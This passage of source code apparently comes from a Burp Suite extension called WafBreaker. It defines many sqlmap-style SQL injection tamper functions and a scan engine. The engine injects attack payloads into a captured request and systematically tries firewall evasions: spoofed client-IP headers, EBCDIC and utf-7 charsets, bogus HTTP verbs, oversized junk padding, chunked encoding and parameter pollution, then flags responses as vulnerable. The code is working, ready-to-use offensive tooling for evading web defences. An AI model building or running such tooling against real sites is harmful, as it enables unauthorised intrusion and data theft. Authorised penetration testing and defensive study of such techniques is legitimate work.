    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!3%s000%s*/%s' % (sql[:idx], digit, sql[idx+1:], postfix)


def tamper_modsecurityzeroversioned(sql):
    """Wrap with /*!00000...*/."""
    idx = sql.find(' ')
    if idx < 0:
        return '/*!00000%s*/' % sql
    postfix = ''
    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!00000%s*/%s' % (sql[:idx], sql[idx+1:], postfix)


def tamper_versionedmorekeywords(sql):
    """Wrap every SQL keyword in /*!KEYWORD*/ (sqlmap versionedmorekeywords.py)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!%s*/' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    result = result.replace(' /*!', '/*!').replace('*/ ', '*/')
    return result


def tamper_halfversionedmorekeywords(sql):
    """Prepend /*!0 before each keyword (MySQL < 5.1 syntax)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!0%s' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    return result.replace(' /*!0', '/*!0')


def tamper_multiplespaces(sql):
    """Replace spaces with multiple spaces (confuses token-based WAF)."""
    return sql.replace(' ', '    ')


def tamper_commentbeforeparentheses(sql):
    """Insert /**/ before every parenthesis."""
    return sql.replace('(', '/**/(')


def tamper_randomcomments(sql):
    """Insert /**/ at random point inside SQL keywords."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS and len(w) > 2:
            mid = _random.randint(1, len(w)-1)
            return w[:mid] + '/**/' + w[mid:]
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_apostrophemask(sql):
    """' → %EF%BC%87  (UTF-8 fullwidth apostrophe)."""
    return sql.replace("'", '%EF%BC%87')


def tamper_apostrophenullencode(sql):
    """' → %00%27."""
    return sql.replace("'", '%00%27')


def tamper_unmagicquotes(sql):
    """' → %BF%27  (multibyte GBK injection for magic-quotes bypass)."""
    return sql.replace("'", '%bf%27%00')


def tamper_appendnullbyte(sql):
    """Append %00 (Access/old PHP null byte trick)."""
    return sql + '%00'


def tamper_bluecoat(sql):
    """Replace spaces after SQL keywords with %09 (tab — Bluecoat proxy bypass)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return w + '%09'
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b(?= )', _replace, sql)


def tamper_sp_password(sql):
    """Append sp_password — MSSQL audit log obfuscation."""
    return sql.rstrip() + ' sp_password'


def tamper_sleep2getlock(sql):
    """SLEEP(N) → GET_LOCK('a',N) — bypasses SLEEP-specific rules."""
    return re.sub(
        r'SLEEP\((\d+)\)',
        lambda m: "GET_LOCK('WafBreaker',%s)" % m.group(1),
        sql, flags=re.IGNORECASE)


def tamper_substring2mid(sql):
    """SUBSTRING → MID."""
    return re.sub(r'\bSUBSTRING\b', 'MID', sql, flags=re.IGNORECASE)


def tamper_concat2concatws(sql):
    """CONCAT(A,B) → CONCAT_WS(MID(CHAR(0),0,0),A,B)."""
    def _repl(m):
        inner = m.group(1)
        return "CONCAT_WS(MID(CHAR(0),0,0),%s)" % inner
    return re.sub(r'\bCONCAT\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ord2ascii(sql):
    """ORD() → ASCII()."""
    return re.sub(r'\bORD\(', 'ASCII(', sql, flags=re.IGNORECASE)


def tamper_informationschemacomment(sql):
    """Append inline comment to information_schema usages."""
    return re.sub(
        r'\binformation_schema\b',
        'information_schema/**/',
        sql, flags=re.IGNORECASE)


def tamper_schemasplit(sql):
    """Split schema.table with comment: db.table → db/**/./**/table."""
    return re.sub(r'(\w+)\.(\w+)', r'\1/**/./**/\2', sql)


def tamper_symboliclogical(sql):
    """AND → &&  / OR → ||  (symbolic operators)."""
    sql = re.sub(r'\bAND\b', '&&', sql, flags=re.IGNORECASE)
    sql = re.sub(r'\bOR\b',  '||', sql, flags=re.IGNORECASE)
    return sql


def tamper_misunion(sql):
    """UNION SELECT → UNION(SELECT — no space before SELECT."""
    return re.sub(r'\bUNION\s+SELECT\b', 'UNION(SELECT', sql, flags=re.IGNORECASE)


def tamper_0eunion(sql):
    """Prepend 0E0 to confuse UNION-detecting regex."""
    return re.sub(r'\bUNION\b', '0E0UNION', sql, flags=re.IGNORECASE)


def tamper_dunion(sql):
    """UNION → DUNION (MySQL quirk for some WAF patterns)."""
    return re.sub(r'\bUNION\b', '.UNION', sql, flags=re.IGNORECASE)


def tamper_scientific(sql):
    """Replace numeric literals with scientific notation: 1 → 1e0."""
    return re.sub(r'\b(\d+)\b', r'\1e0', sql)


def tamper_binary(sql):
    """Prepend BINARY to string comparisons for MySQL collation bypass."""
    return re.sub(r"='([^']*)'", r"=BINARY'\1'", sql)


def tamper_if2case(sql):
    """IF(A,B,C) → CASE WHEN (A) THEN (B) ELSE (C) END."""
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'CASE WHEN (%s) THEN (%s) ELSE (%s) END' % tuple(args)
        return m.group(0)
    return re.sub(r'\bIF\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ifnull2casewhenisnull(sql):
    """IFNULL(A,B) → CASE WHEN ISNULL(A) THEN (B) ELSE (A) END."""
    def _repl(m):
        args = m.group(1).split(',', 1)
        if len(args) == 2:
            a, b = args
            return 'CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END' % (a, b, a)
        return m.group(0)
    return re.sub(r'\bIFNULL\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_unionalltounion(sql):
    """UNION ALL SELECT → UNION SELECT."""
    return re.sub(r'\bUNION\s+ALL\s+SELECT\b', 'UNION SELECT', sql, flags=re.IGNORECASE)


def tamper_plus2concat(sql):
    """+ → CONCAT() for MSSQL."""
    # Replace string concatenation + with {fn CONCAT}
    return re.sub(r"'([^']*)'\+", r"CONCAT('\1',", sql)


def tamper_commalesslimit(sql):
    """LIMIT M,N → LIMIT N OFFSET M."""
    return re.sub(
        r'\bLIMIT\s+(\d+)\s*,\s*(\d+)',
        r'LIMIT \2 OFFSET \1',
        sql, flags=re.IGNORECASE)


def tamper_commalessmid(sql):
    """MID(A,B,C) → MID(A FROM B FOR C)."""
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'MID(%s FROM %s FOR %s)' % tuple(a.strip() for a in args)
        return m.group(0)
    return re.sub(r'\bMID\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_escapequotes(sql):
    """Backslash-escape single and double quotes."""
    return sql.replace("'", "\\'").replace('"', '\\"')


def tamper_hex2char(sql):
    """0xHH hex literals → CHAR(N) equivalents."""
    def _repl(m):
        val = int(m.group(1), 16)
        return 'CHAR(%d)' % val
    return re.sub(r'0x([0-9a-fA-F]{2})', _repl, sql)


def tamper_luanginx(sql):
    """Insert \\n before each keyword (Lua-Nginx WAF bypass)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '\n' + w
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


# ── Master tamper registry ────────────────────────────────────────────────────
# (name, function, description, applicable_db)
#   db: 'any', 'mysql', 'mssql', 'pgsql', 'oracle'

SQLI_TAMPERS = [
    # ── Space substitution ────────────────────────────────────────────────────
    ("space2comment",          tamper_space2comment,          "Spaces → /**/",                       "any"),
    ("space2plus",             tamper_space2plus,             "Spaces → +",                          "any"),
    ("space2dash",             tamper_space2dash,             "Spaces → --\\nN",                     "mysql"),
    ("space2hash",             tamper_space2hash,             "Spaces → #\\n",                       "mysql"),
    ("space2mssqlblank",       tamper_space2mssqlblank,       "Spaces → random %0X (MSSQL)",         "mssql"),
    ("space2mysqlblank",       tamper_space2mysqlblank,       "Spaces → random %0X (MySQL)",         "mysql"),
    ("space2randomblank",      tamper_space2randomblank,      "Spaces → random blank variant",       "any"),
    ("space2morecomment",      tamper_space2morecomment,      "Spaces → /**_**/",                    "any"),
    # ── Encoding ─────────────────────────────────────────────────────────────
    ("charencode",             tamper_charencode,             "URL-encode each char",                "any"),
    ("chardoubleencode",       tamper_chardoubleencode,       "Double URL-encode",                   "any"),
    ("charunicodeencode",      tamper_charunicodeencode,      "Unicode %uXXXX alphanums",            "any"),
    ("charunicodeescape",      tamper_charunicodeescape,      "\\uXXXX escape alphanums",            "any"),
    ("percentage",             tamper_percentage,             "%S%E%L%E%C%T — ASP/IIS bypass",       "mssql"),
    ("overlongutf8",           tamper_overlongutf8,           "Overlong UTF-8 non-alphanums",        "any"),
    ("htmlencode",             tamper_htmlencode,             "HTML entity non-alphanums",           "any"),
    ("decentities",            tamper_decentities,            "&#N; all characters",                 "any"),
    ("hexentities",            tamper_hexentities,            "&#xN; hex all characters",            "any"),
    # ── Case / comment ────────────────────────────────────────────────────────
    ("randomcase",             tamper_randomcase,             "sElEcT random casing",                "any"),
    ("uppercase",              tamper_uppercase,              "UPPERCASE keywords",                  "any"),
    ("lowercase",              tamper_lowercase,              "lowercase keywords",                  "any"),
    ("randomcomments",         tamper_randomcomments,         "SE/**/LECT mid-keyword comments",     "any"),
    ("multiplespaces",         tamper_multiplespaces,         "Multiple spaces between tokens",      "any"),
    ("commentbeforeparentheses",tamper_commentbeforeparentheses,"/**/ before ( — SLEEP/**/(5)",     "any"),
    ("bluecoat",               tamper_bluecoat,               "Keyword%09 — Bluecoat proxy",         "any"),
    ("luanginx",               tamper_luanginx,               "Newline before keywords (Lua-nginx)", "any"),
    # ── MySQL versioned comments ──────────────────────────────────────────────
    ("modsecurityversioned",    tamper_modsecurityversioned,    "/*!3XREMAINDER*/",                  "mysql"),
    ("modsecurityzeroversioned",tamper_modsecurityzeroversioned,"/*!00000REMAINDER*/",              "mysql"),
    ("versionedmorekeywords",   tamper_versionedmorekeywords,   "/*!KEYWORD*/ wrapping",             "mysql"),
    ("halfversionedmorekeywords",tamper_halfversionedmorekeywords,"/*!0KEYWORD prefixing",          "mysql"),
    # ── Operator substitution ─────────────────────────────────────────────────
    ("between",                tamper_between,                "= → BETWEEN, > → NOT BETWEEN",        "any"),
    ("equaltolike",            tamper_equaltolike,            "= → LIKE",                            "any"),
    ("equaltorlike",           tamper_equaltorlike,           "= → RLIKE (MySQL)",                   "mysql"),
    ("greatest",               tamper_greatest,               "> → GREATEST(A,B+1)=A",               "any"),
    ("least",                  tamper_least,                  "< → LEAST(A,B+1)=A",                  "any"),
    ("symboliclogical",        tamper_symboliclogical,        "AND→&& OR→||",                        "any"),
    # ── String/function substitution ──────────────────────────────────────────
    ("apostrophemask",         tamper_apostrophemask,         "' → %EF%BC%87 (fullwidth)",           "any"),
    ("apostrophenullencode",   tamper_apostrophenullencode,   "' → %00%27",                          "any"),
    ("unmagicquotes",          tamper_unmagicquotes,          "' → %BF%27 GBK multibyte",            "mysql"),
    ("escapequotes",           tamper_escapequotes,           "\\\\'  backslash-escape quotes",      "any"),
    ("appendnullbyte",         tamper_appendnullbyte,         "Append %00 null byte",                "any"),
    ("sp_password",            tamper_sp_password,            "Append sp_password (MSSQL log)",      "mssql"),
    ("sleep2getlock",          tamper_sleep2getlock,          "SLEEP → GET_LOCK (MySQL)",             "mysql"),
    ("substring2mid",          tamper_substring2mid,          "SUBSTRING → MID",                     "mysql"),
    ("concat2concatws",        tamper_concat2concatws,        "CONCAT → CONCAT_WS",                  "mysql"),
    ("ord2ascii",              tamper_ord2ascii,              "ORD → ASCII",                         "mysql"),
    ("informationschemacomment",tamper_informationschemacomment,"information_schema/**/ comment",   "mysql"),
    ("schemasplit",            tamper_schemasplit,            "db/**/./**/table schema split",       "any"),
    ("binary",                 tamper_binary,                 "BINARY prefix collation bypass",      "mysql"),
    ("if2case",                tamper_if2case,                "IF→CASE WHEN",                        "any"),
    ("ifnull2casewhenisnull",  tamper_ifnull2casewhenisnull,  "IFNULL→CASE WHEN ISNULL",             "any"),
    ("commalesslimit",         tamper_commalesslimit,         "LIMIT M,N → LIMIT N OFFSET M",        "any"),
    ("commalessmid",           tamper_commalessmid,           "MID(A,B,C) → MID(A FROM B FOR C)",    "any"),
    ("hex2char",               tamper_hex2char,               "0xHH → CHAR(N)",                      "any"),
    # ── UNION tricks ──────────────────────────────────────────────────────────
    ("0eunion",                tamper_0eunion,                "UNION → 0E0UNION",                    "any"),
    ("dunion",                 tamper_dunion,                 "UNION → .UNION",                      "mysql"),
    ("misunion",               tamper_misunion,               "UNION SELECT → UNION(SELECT",         "mysql"),
    ("unionalltounion",        tamper_unionalltounion,        "UNION ALL SELECT → UNION SELECT",     "any"),
    # ── Numeric obfuscation ───────────────────────────────────────────────────
    ("scientific",             tamper_scientific,             "1 → 1e0 numeric literals",            "mysql"),
]


# ═══════════════════════════════════════════════════════════════════════════════
#   MAIN EXTENDER
# ═══════════════════════════════════════════════════════════════════════════════

class BurpExtender(IBurpExtender, IContextMenuFactory):

    # How long to pause between HTTP requests (seconds).
    # 0.6 s ≈ ~1.6 req/s — gentle enough for most apps.
    REQUEST_DELAY = 0.6

    def registerExtenderCallbacks(self, callbacks):
        self._cb      = callbacks
        self._h       = callbacks.getHelpers()
        callbacks.setExtensionName(EXT_NAME)
        callbacks.registerContextMenuFactory(self)

        self._p("[*] WafBreaker v%s ready." % VERSION)
        self._p("[*] Results appear in: Extensions > WafBreaker > Output")
        self._p("[*] Payloads — XSS:%d | SQLi:%d | CMDi:%d | LFI:%d | SSRF:%d" % (
            len(PAYLOADS["XSS"]), len(PAYLOADS["SQL Injection"]),
            len(PAYLOADS["Command Injection"]), len(PAYLOADS["LFI"]),
            len(PAYLOADS["SSRF"])))

    def _p(self, msg):
        self._cb.printOutput(msg)

    # ── IContextMenuFactory ───────────────────────────────────────────────────
    def createMenuItems(self, invocation):
        self._invocation = invocation
        items = ArrayList()
        main = JMenu(u"⚡ " + EXT_NAME)

        for vtype in PAYLOADS.keys():
            item = JMenuItem(vtype)
            # Capture loop var
            item.addActionListener(lambda e, v=vtype: self._dispatch(v))
            main.add(item)

        items.add(main)
        return items

    def _dispatch(self, vuln_type):
        msgs = self._invocation.getSelectedMessages()
        if not msgs:
            self._p("[!] No request selected.")
            return

        bounds = None
        try:
            b = self._invocation.getSelectionBounds()
            if b and len(b) == 2 and b[0] != b[1]:
                bounds = (b[0], b[1])
        except Exception:
            pass

        class _Worker(Runnable):
            def __init__(self, ext, msg, vtype, bnd):
                self.ext   = ext
                self.msg   = msg
                self.vtype = vtype
                self.bnd   = bnd
            def run(self):
                try:
                    ScanEngine(
                        self.ext._cb,
                        self.ext._h,
                        self.ext.REQUEST_DELAY,
                        self.msg,
                        self.vtype,
                        self.bnd
                    ).run()
                except Exception as exc:
                    self.ext._cb.printOutput("[ERROR] " + str(exc))

        JThread(_Worker(self, msgs[0], vuln_type, bounds)).start()


# ═══════════════════════════════════════════════════════════════════════════════
#   SCAN ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class ScanEngine(object):

    JUNK_SIZE_BYTES = 135000   # ~132 KB  — exceeds Cloudflare/AWS/Azure WAF limits

    def __init__(self, callbacks, helpers, req_delay, message, vuln_type, bounds):
        self._cb        = callbacks
        self._h         = helpers
        self._delay     = req_delay     # seconds between requests (rate-limiting)
        self._msg       = message
        self._vtype     = vuln_type
        self._bounds    = bounds
        self._svc       = message.getHttpService()
        self._base_req  = message.getRequest()
        self._waf_found = False
        self._bypass    = None           # dict describing working bypass
        self._req_count = 0              # total requests sent this scan

    def _log(self, msg):
        self._cb.printOutput("[WafBreaker][%s] %s" % (self._vtype, msg))

    def _report(self, technique, payload, status, body, outcome):
        """Emit one result line to Burp's extension Output tab."""
        snippet = (body[:100].replace('\n', ' ').replace('\r', '')) if body else ""
        line = "[%s] %-40s HTTP %-3d | %s | %s" % (
            outcome.ljust(7), technique[:40], status,
            payload[:70].replace('\n', ' '), snippet[:60])
        self._cb.printOutput(line)

    # ── HTTP transport ────────────────────────────────────────────────────────
    def _send(self, req_bytes):
        """
        Returns (status_code, body_str).  On error returns (0, '').
        Enforces per-request sleep to avoid flooding the target application.
        """
        # Rate-limit: sleep before every request except the very first
        if self._req_count > 0:
            time.sleep(self._delay)
        self._req_count += 1
        try:
            resp_obj  = self._cb.makeHttpRequest(self._svc, req_bytes)
            resp_raw  = resp_obj.getResponse()
            if not resp_raw:
                return 0, ""
            analyzed  = self._h.analyzeResponse(resp_raw)
            status    = analyzed.getStatusCode()
            offset    = analyzed.getBodyOffset()
            body      = self._h.bytesToString(resp_raw[offset:])
            return status, body
        except Exception as ex:
            self._log("Transport error: " + str(ex))
            return 0, ""

    # ── Request builder ───────────────────────────────────────────────────────
    def _build_request(self, payload,
                       extra_headers=None,
                       override_method=None,
                       charset=None,
                       add_junk=False):
        """
        Inject payload at the selection (or last body param),
        then apply bypass modifiers and return a byte array.
        """
        base = bytearray(self._base_req)

        # Convert payload to bytes (Jython 2.7 compatible)
        try:
            if isinstance(payload, unicode):
                pay_bytes = bytearray(payload.encode('utf-8'))
            else:
                # str in Python 2.7 — encode first to get bytes safely
                pay_bytes = bytearray(payload.encode('utf-8') if hasattr(payload, 'encode') else payload)
        except (TypeError, UnicodeDecodeError):
            pay_bytes = bytearray([ord(c) & 0xFF for c in str(payload)])

        # ── Injection point ───────────────────────────────────────────────────
        if self._bounds:
            start, end = self._bounds
            modified = base[:start] + pay_bytes + base[end:]
        else:
            # Fallback: replace last parameter's value
            analyzed = self._h.analyzeRequest(self._svc, bytes(base))
            params   = analyzed.getParameters()
            injected = False
            if params:
                for i in range(len(params) - 1, -1, -1):
                    p = params[i]
                    # PARAM_BODY = 1, PARAM_URL = 0
                    if p.getType() in (0, 1):
                        ps = p.getValueStart()
                        pe = p.getValueEnd()
                        modified = base[:ps] + pay_bytes + base[pe:]
                        injected = True
                        break
            if not injected:
                modified = base

        # ── Junk padding (body-size bypass) ───────────────────────────────────
        if add_junk:
            junk_str = "&wafbypass=" + "W" * self.JUNK_SIZE_BYTES
            junk = bytearray([ord(c) for c in junk_str])
            modified = bytearray(modified) + junk

        # ── Decompose into headers + body ─────────────────────────────────────
        analyzed2 = self._h.analyzeRequest(bytes(modified))
        headers   = list(analyzed2.getHeaders())
        body_off  = analyzed2.getBodyOffset()
        body      = bytearray(modified[body_off:])

        # ── Override HTTP verb ────────────────────────────────────────────────
        if override_method:
            first = headers[0]
            sp    = first.find(' ')
            if sp != -1:
                headers[0] = override_method + first[sp:]

        # ── Extra headers ─────────────────────────────────────────────────────
        if extra_headers:
            # Remove existing headers with same name to avoid duplication
            names = [h.split(':')[0].lower() for h in extra_headers]
            headers = [h for h in headers
                       if h.split(':')[0].lower() not in names
                       or h == headers[0]]  # keep request line
            for eh in extra_headers:
                headers.append(eh)

        # ── Charset manipulation ──────────────────────────────────────────────
        if charset:
            for i, h in enumerate(headers):
                if h.lower().startswith("content-type:"):
                    h = re.sub(r';\s*charset=[^\s;]*', '', h,
                                flags=re.IGNORECASE).rstrip()
                    headers[i] = h + '; charset=' + charset
                    break

        # ── Build final request & fix Content-Length ──────────────────────────
        final = self._h.buildHttpMessage(headers, bytes(body))
        return self._fix_cl(final)

    def _fix_cl(self, req_bytes):
        """Update Content-Length to match actual body length."""
        analyzed = self._h.analyzeRequest(req_bytes)
        headers  = list(analyzed.getHeaders())
        off      = analyzed.getBodyOffset()
        body     = req_bytes[off:]
        blen     = len(body)
        updated  = []
        has_cl   = False
        for h in headers:
            if h.lower().startswith("content-length:"):
                updated.append("Content-Length: " + str(blen))
                has_cl = True
            else:
                updated.append(h)
        if not has_cl and blen > 0:
            updated.append("Content-Length: " + str(blen))
        return self._h.buildHttpMessage(updated, body)

    # ── WAF / success detection ───────────────────────────────────────────────
    def _is_blocked(self, status, body):
        if status in WAF_STATUS_CODES:
            return True
        bl = body.lower()
        for pat in WAF_BODY_PATTERNS:
            if re.search(pat, bl):
                return True
        return False

    def _is_vuln(self, status, body):
        if status not in (200, 201, 302, 301):
            return False
        for pat in SUCCESS_PATTERNS.get(self._vtype, []):
            if re.search(pat, body, re.IGNORECASE):
                return True
        return False

    # ── Outcome label ─────────────────────────────────────────────────────────
    def _outcome(self, status, body):
        if self._is_vuln(status, body):
            return "VULN!"
        if self._is_blocked(status, body):
            return "BLOCKED"
        if status == 0:
            return "ERROR"
        return "PASSED"

    # ═════════════════════════════════════════════════════════════════════════
    #   MAIN EXECUTION
    # ═════════════════════════════════════════════════════════════════════════
    def run(self):
        self._log("=" * 55)
        self._log("Scan started  |  target: %s:%d" % (
            self._svc.getHost(), self._svc.getPort()))

        probe = INITIAL_PROBES[self._vtype]

        # ── Phase 1: Initial probe ────────────────────────────────────────────
        self._log("[Phase 1]  Initial probe → " + probe[:60])
        req = self._build_request(probe)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("Initial Probe", probe, status, body, oc)

        if self._is_blocked(status, body):
            self._log("[!] WAF detected (HTTP %d).  Engaging bypass phase..." % status)
            self._waf_found = True
            self._phase_bypass(probe)
        else:
            self._log("[+] No WAF block on probe (HTTP %d).  Skipping bypass phase." % status)

        # ── Phase 3: Full payload sweep ───────────────────────────────────────
        self._phase_payloads()

        # ── Phase 4: Tamper sweep across all SQLi categories (SQLi only) ──────
        self._phase_tamper_sweep()

        self._log("=" * 55)
        self._log("Scan complete — %d requests sent." % self._req_count)

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 2 — WAF BYPASS TECHNIQUES
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_bypass(self, probe):
        self._log("[Phase 2]  Testing bypass techniques...")

        # ── 2-A: HTTP Header Trust ────────────────────────────────────────────
        # Article: WAFs trust X-Forwarded-For etc. to determine source IP
        self._log("[2-A] HTTP Header Trust...")

        header_sets = [
            (["X-Forwarded-For: 127.0.0.1"],                          "XFF: 127.0.0.1"),
            (["X-Originating-IP: 127.0.0.1"],                         "X-Orig-IP: 127.0.0.1"),
            (["X-Remote-IP: 127.0.0.1"],                              "X-Remote-IP: 127.0.0.1"),
            (["X-Remote-Addr: 127.0.0.1"],                            "X-Remote-Addr: 127.0.0.1"),
            (["X-Client-IP: 127.0.0.1"],                              "X-Client-IP: 127.0.0.1"),
            (["X-Real-IP: 127.0.0.1"],                                "X-Real-IP: 127.0.0.1"),
            (["True-Client-IP: 127.0.0.1"],                           "True-Client-IP: 127.0.0.1"),
            (["Cluster-Client-IP: 127.0.0.1"],                        "Cluster-Client-IP"),
            (["Forwarded: for=127.0.0.1"],                            "Forwarded RFC7239"),
            (["X-Forwarded-For: 10.0.0.1"],                           "XFF: 10.0.0.1"),
            (["X-Forwarded-For: 192.168.0.1"],                        "XFF: 192.168.0.1"),
            ([   # All at once — belt and suspenders
                "X-Forwarded-For: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Remote-Addr: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
            ], "All Trust Headers"),
        ]

        for hdrs, label in header_sets:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": hdrs}

        # ── 2-B: Charset manipulation (ibm037 / EBCDIC) ───────────────────────
        # Article: charset=ibm037 makes WAF unable to read payload; backend decodes it fine
        self._log("[2-B] Charset manipulation (ibm037)...")

        encoded_probe = ibm037_encode(probe)
        req = self._build_request(encoded_probe, charset="ibm037")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: ibm037", encoded_probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] ibm037 charset bypass WORKED!")
            self._bypass = {"type": "charset_ibm037"}

        # utf-7
        req = self._build_request(probe, charset="utf-7")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-7", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-7"}

        # utf-16
        req = self._build_request(probe, charset="utf-16")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-16", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-16"}

        # ── 2-C: HTTP Method manipulation ─────────────────────────────────────
        # Article: WAF may only inspect known verbs; unknown verbs bypass inspection
        self._log("[2-C] HTTP Method override...")

        for method in ["TestingWafBypass", "FUZZ", "WAFBYPASS", "OPTIONS"]:
            req = self._build_request(probe, override_method=method)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Method: " + method,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Method bypass WORKED: " + method)
                self._bypass = {"type": "method", "verb": method}

        # ── 2-D: Large body padding (nowafpls technique) ──────────────────────
        # Article: WAF inspects only first N KB; padding pushes payload past limit
        self._log("[2-D] Body size padding (%d KB)..." % (self.JUNK_SIZE_BYTES // 1024))

        req = self._build_request(probe, add_junk=True)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Body padding ~%dKB" % (
            self.JUNK_SIZE_BYTES // 1024), probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] Body-size bypass WORKED!")
            self._bypass = {"type": "junk"}

        # ── 2-E: X-HTTP-Method-Override & tunnelling headers ──────────────────
        self._log("[2-E] X-HTTP-Method-Override headers...")

        for oh in [
            ["X-HTTP-Method-Override: GET"],
            ["X-HTTP-Method-Override: PUT"],
            ["X-Method-Override: GET"],
            ["_method=GET"],
            ["X-HTTP-Method: DELETE"],
        ]:
            req = self._build_request(probe, extra_headers=oh)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + oh[0][:40],
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Override header bypass WORKED: " + oh[0])
                self._bypass = {"type": "override_header", "headers": oh}

        # ── 2-F: WAF-confusing Content-Type values ────────────────────────────
        self._log("[2-F] Content-Type confusion...")

        ct_tests = [
            (["Content-Type: application/json"],             "CT: json"),
            (["Content-Type: text/xml"],                     "CT: xml"),
            (["Content-Type: application/x-www-form-urlencoded; boundary=--"], "CT: boundary"),
            (["Content-Type: multipart/form-data; boundary=----Boundary"],     "CT: multipart"),
        ]
        for hdrs, label in ct_tests:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Content-Type confusion bypass WORKED: " + label)
                self._bypass = {"type": "ct", "headers": hdrs}

        # ── 2-G: SQLMap-style tamper probes (SQL Injection only) ─────────────────
        # Each tamper function is applied to the raw probe string.
        # The first one that passes the WAF becomes the active tamper bypass.
        if self._vtype == "SQL Injection":
            self._log("[2-G] Tamper script probes (%d tampers)..." % len(SQLI_TAMPERS))
            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                try:
                    tampered_probe = tfunc(probe)
                except Exception:
                    continue
                if tampered_probe == probe:
                    continue    # tamper had no effect on this probe — skip
                req = self._build_request(tampered_probe)
                status, body = self._send(req)
                oc = self._outcome(status, body)
                self._report(
                    "[Bypass] Tamper: %s" % tname,
                    tampered_probe, status, body, oc)
                if not self._is_blocked(status, body) and not self._bypass:
                    self._log("[+] Tamper bypass WORKED: %s (%s)" % (tname, tdesc))
                    self._bypass = {"type": "tamper", "func": tfunc, "name": tname}

        # ── 2-H: Chunked Transfer-Encoding bypass ─────────────────────────────
        # WAFs often skip reassembly; backend handles chunked correctly.
        self._log("[2-H] Chunked Transfer-Encoding...")
        chunked_hdrs = [
            "Transfer-Encoding: chunked",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        req = self._build_request(probe, extra_headers=chunked_hdrs)
        # Re-encode body as a single hex chunk
        try:
            req_lines = req.split(bytearray([13, 10]))      # CRLF split
            # Find empty line separating headers from body
            blank_idx = None
            for i, line in enumerate(req_lines):
                if len(line) == 0:
                    blank_idx = i
                    break
            if blank_idx is not None:
                body_bytes = bytearray([13, 10]).join(req_lines[blank_idx+1:])
                chunk_size = len(body_bytes)
                crlf = bytearray([13, 10])
                chunk_hdr = bytearray([ord(c) for c in "%X" % chunk_size]) + crlf
                chunk_end = bytearray([ord('0')]) + crlf + crlf
                chunked_body = chunk_hdr + body_bytes + crlf + chunk_end
                req = bytearray([13, 10]).join(req_lines[:blank_idx+1]) + crlf + crlf + chunked_body
        except Exception:
            pass    # fall through with unmodified request
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Chunked TE", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] Chunked Transfer-Encoding bypass WORKED!")
            self._bypass = {"type": "header", "headers": chunked_hdrs}

        # ── 2-I: HTTP Parameter Pollution (HPP) ───────────────────────────────
        # Send the same param twice — one clean, one with payload.
        # Some WAFs only evaluate the first occurrence; backend merges or uses last.
        self._log("[2-I] HTTP Parameter Pollution...")
        hpp_hdrs = ["X-WafBypass-HPP: 1"]
        req = self._build_request("dummy" + "&" + probe.lstrip("'\" "), extra_headers=hpp_hdrs)
        status, body = self._send(req)
        oc = self._outcome(status, body)
